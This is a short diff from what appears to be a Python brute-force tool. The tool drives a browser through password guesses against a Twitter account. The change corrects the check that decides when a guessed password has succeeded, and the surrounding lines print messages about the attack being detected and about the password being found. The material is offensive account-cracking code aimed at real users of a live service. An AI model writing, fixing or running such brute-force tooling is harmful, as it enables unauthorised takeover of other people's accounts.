@@ -195,7 +195,7 @@ def bruteforce(driver):
         print(R + (
             "   WARNING \t| Twitter probably found out your attacking this account.".format(USERNAME, password)) + W)
     # if it fails you land on /session/new or /login/check
-    elif "https://mobile.twitter.com/home/" not in url:
+    elif "https://mobile.twitter.com/home/" in url:
         # if thats not the case we found the password!
         print(G + ("   SUCCESS \t| Username: {} \t| Password found: {} \n".format(USERNAME, password)) + W)
 
